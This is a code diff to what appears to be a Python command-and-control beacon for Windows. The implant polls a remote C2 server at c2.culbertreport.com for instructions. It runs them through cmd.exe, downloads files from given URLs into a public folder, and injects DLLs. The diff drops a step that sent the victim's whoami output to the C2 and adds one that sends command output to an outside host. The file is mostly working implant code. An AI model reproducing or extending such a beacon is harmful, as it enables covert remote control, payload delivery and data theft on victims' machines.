@@ -63,11 +63,13 @@ def cmdexe(beacon_command):
     Returns the output if any available
     """
     DETACHED_PROCESS = 0x00000008  # For console processes, the new process does not inherit its parent's console
-    # https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags?redirectedfrom=MSDN 
-    results = subprocess.Popen(['cmd.exe', '/C', beacon_command], close_fds=True, creationflags=DETACHED_PROCESS,
-                               stdout=PIPE)
-    output = results.stdout.read()
-    return output
+    # https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags?redirectedfrom=MSDN
+    command = ['cmd.exe', '/C', beacon_command]
+    process = subprocess.Popen(command, close_fds=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
+    out, err = process.communicate()
+    out = out.decode()
+    print(out)
+    return out
 
 
 def dwnld(url, ext):
@@ -78,21 +80,9 @@ def dwnld(url, ext):
     r = requests.get(url)
     open(f'C:\\Users\\Public\\test{ext}', 'wb').write(r.content)
 
-
-# Get our name
-who = subprocess.Popen('whoami', stdout=subprocess.PIPE)
-who = who.stdout.read()
-
-# Structure our name
-headers = {'X-Transact': 'Action', 'Hello': str(who), 'ID': '1'}
-data = {'ID': '1'}
-
-# Send our name
-r = requests.post('http://c2.culbertreport.com:8000', headers=headers, data=data)
-#time.sleep(20)
-
+# , cert=('client.crt', 'client.key'), verify='ca.crt'
 while 1:
-    a = requests.get('http://c2.culbertreport.com:8000', headers=headers)
+    a = requests.get('http://c2.culbertreport.com:8000')
     cmd = a.text
     print(cmd)
     op = cmd.split(';')[0]
@@ -100,7 +90,10 @@ while 1:
     ex = cmd.split(';')[2]
     if op == 'cmd':
         output = cmdexe(cm)
-        #r = requests.get('http://c2.culbertreport.com:8000', headers=headers, data=output)
+        response = requests.post('http://httpbin.org/post', data=output)
+        print(response.request.url)
+        print(response.request.body)
+        print(response.request.headers)
     if op == 'inject':
         dll_inject(cm)
     if op == 'download':
